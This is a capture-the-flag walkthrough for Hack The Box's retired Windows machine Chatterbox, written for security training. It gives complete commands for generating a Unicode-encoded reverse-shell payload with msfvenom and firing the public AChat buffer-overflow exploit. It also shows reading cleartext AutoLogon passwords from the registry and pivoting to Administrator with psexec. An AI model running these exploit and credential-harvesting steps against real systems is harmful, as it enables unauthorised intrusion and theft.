---
machine: Chatterbox
os: Windows
difficulty: Medium
platform: Hack The Box
category: Services / Windows
state: Retired
tags: [windows, buffer-overflow, achat, edb-36025, autologon, psexec]
---

# Chatterbox — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

The interesting service is not SMB: it is two odd ports (**9255/9256**) running **AChat 0.150 beta7**, with a public *buffer overflow* (EDB 36025). The hard part is that the payload must survive the protocol's **Unicode** conversion. The shell lands as `alfred`, and the registry's `Winlogon` key holds cleartext **AutoLogon** credentials that also work for `Administrator`.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 SP1
9255/tcp open  http         AChat chat system httpd
9256/tcp open  achat        AChat chat system
```

SMB leads nowhere; the box name and ports 9255/9256 point at the chat app.

```bash
searchsploit achat
# Achat 0.150 beta7 - Remote Buffer Overflow | windows/remote/36025.py
```

## Access

1. **Adapt the exploit**: the original pops `calc.exe`. Generate a **Unicode-safe** reverse shell (the protocol stuffs each byte into a `WORD`, so `0x00` and bytes interpreted as bad chars must be avoided):

```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp \
  LHOST=<IP> LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f' \
  BufferRegister=EAX -f python
```

2. **Run the exploit** against 9256 with the shellcode swapped in and a listener up:

```bash
nc -lvnp 443
python2 36025.py <IP>
```

```text
C:\Users\alfred\Desktop> whoami
chatterbox\alfred
```

## Escalation

1. **Registry credentials** (AutoLogon):

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultUserName
```

It returns `Alfred` and the password **in clear**. That same password works for `Administrator`.

2. **Run as administrator**:

```bash
psexec.py Administrator:'<password>'@<IP>
# or
winexe -U 'Administrator%<password>' //<IP> cmd.exe
```

```text
C:\Windows\system32> whoami
nt authority\system
```

## Pitfalls

- **Unicode**: a plain `shell_reverse_tcp` will not do; without `unicode_mixed` and `BufferRegister=EAX` the process dies.
- **Listener port**: 443 avoids flakiness; other ports can inject problematic bytes into the shellcode.
- **Python 2 exploit**: it uses `print` statements and byte strings; porting to Python 3 needs edits.
- **Odd `root.txt` ACL**: some versions of the box allow an `icacls` tweak, but the clean path is arriving as `Administrator`.

## Lessons

- Niche software in a lab usually means a public exploit: pinning the version is half the work.
- An overflow with encoding conversion needs tailored shellcode; the right encoder separates a shell from a crash.
- `AutoLogon` stores the password in cleartext in the registry: attackers with a shell look there first.
- Mitigation: patch the service, remove AutoLogon, and never reuse passwords across accounts.
